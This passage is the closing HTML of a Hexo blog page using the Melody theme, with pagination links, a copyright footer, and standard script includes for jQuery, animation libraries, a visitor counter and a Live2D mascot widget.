href="/page/20/">20</a><a class="extend next" rel="next" href="/page/12/"><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2022 By vague huang</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/lib/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body></html>